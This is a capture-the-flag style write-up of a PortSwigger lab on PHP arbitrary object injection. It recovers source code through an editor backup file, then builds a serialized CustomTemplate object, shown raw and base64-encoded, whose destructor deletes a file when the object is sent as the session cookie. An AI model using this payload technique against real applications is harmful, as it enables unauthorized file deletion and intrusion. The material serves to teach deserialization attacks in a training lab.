
# Arbitrary object injection in PHP

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter

Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.


---------------------------------------------

References: 

- https://portswigger.net/web-security/deserialization/exploiting





![img](images/Arbitrary%20object%20injection%20in%20PHP/1.png)
![img](images/Arbitrary%20object%20injection%20in%20PHP/2.png)

---------------------------------------------

First intercept a request after logging in:



![img](images/Arbitrary%20object%20injection%20in%20PHP/3.png)


Then decode the content of the session cookie:

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jhc3a45gerbcjxx72wi9m1xydqvwubxa";}
```



![img](images/Arbitrary%20object%20injection%20in%20PHP/4.png)


From Burp we can find a PHP file in /libs:



![img](images/Arbitrary%20object%20injection%20in%20PHP/5.png)


And read it at “/libs/CustomTemplate.php~”:



![img](images/Arbitrary%20object%20injection%20in%20PHP/6.png)



```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

From https://www.php.net/manual/en/function.unlink.php:



![img](images/Arbitrary%20object%20injection%20in%20PHP/7.png)



We have to create a “CustomTemplate” object that calls “\_\_destruct()” so it deletes the file “/home/carlos/morale.txt”, something like \_\_destruct("/home/carlos/morale.txt"). We will initialize “template_file_path” and “lock_file_path” to the path of the file we want to delete:

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```



![img](images/Arbitrary%20object%20injection%20in%20PHP/8.png)


And send it in a request. It generates a 500 error code but the file is deleted:

```
GET / HTTP/2
...
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
...
```



![img](images/Arbitrary%20object%20injection%20in%20PHP/9.png)

